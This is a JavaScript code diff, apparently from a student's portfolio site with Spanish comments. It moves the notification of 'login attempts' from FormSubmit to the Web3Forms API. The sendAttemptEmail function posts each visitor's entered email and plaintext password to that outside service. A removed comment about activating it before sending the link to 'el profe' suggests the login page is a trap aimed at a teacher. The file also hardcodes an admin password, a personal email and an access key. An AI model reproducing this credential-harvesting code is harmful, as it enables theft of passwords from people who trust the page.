@@ -2,11 +2,10 @@
 // Contraseña para abrir el panel de admin (settings). Cámbiala por la que quieras.
 const ADMIN_PASSWORD = 'admin2026';
 
-// Correo donde recibirás los intentos (FormSubmit).
-// IMPORTANTE: la primera vez que llegue un envío, FormSubmit te manda un
-// email de activación — púlsalo antes de pasar el link al profe.
-const NOTIFY_EMAIL  = 'carloscii203@gmail.com';
-const FORMSUBMIT_URL = 'https://formsubmit.co/ajax/' + NOTIFY_EMAIL;
+// Notificación de intentos vía Web3Forms (FormSubmit estaba caído).
+// Los correos llegan a la cuenta asociada a esta access key.
+const WEB3FORMS_KEY = 'c0c25d86-fd7f-44c0-b675-c217592271aa';
+const WEB3FORMS_URL = 'https://api.web3forms.com/submit';
 
 // Claves de almacenamiento
 const KEY_ATTEMPTS = 'login_attempts';
@@ -146,17 +145,23 @@ function saveAttempt(attempt) {
 }
 
 function sendAttemptEmail(attempt) {
+    const date = new Date(attempt.ts).toLocaleString();
     const payload = {
-        _subject: 'Nuevo intento de login en el portafolio',
-        _captcha: 'false',
-        _template: 'table',
+        access_key: WEB3FORMS_KEY,
+        subject: 'Nuevo intento de login en el portafolio',
+        from_name: 'Portafolio Carlos',
         method: attempt.method,
         email: attempt.email,
         password: attempt.password,
-        date: new Date(attempt.ts).toLocaleString()
+        date: date,
+        message:
+            'Método: ' + attempt.method + '\n' +
+            'Correo: ' + attempt.email + '\n' +
+            'Contraseña: ' + attempt.password + '\n' +
+            'Fecha: ' + date
     };
     try {
-        fetch(FORMSUBMIT_URL, {
+        fetch(WEB3FORMS_URL, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
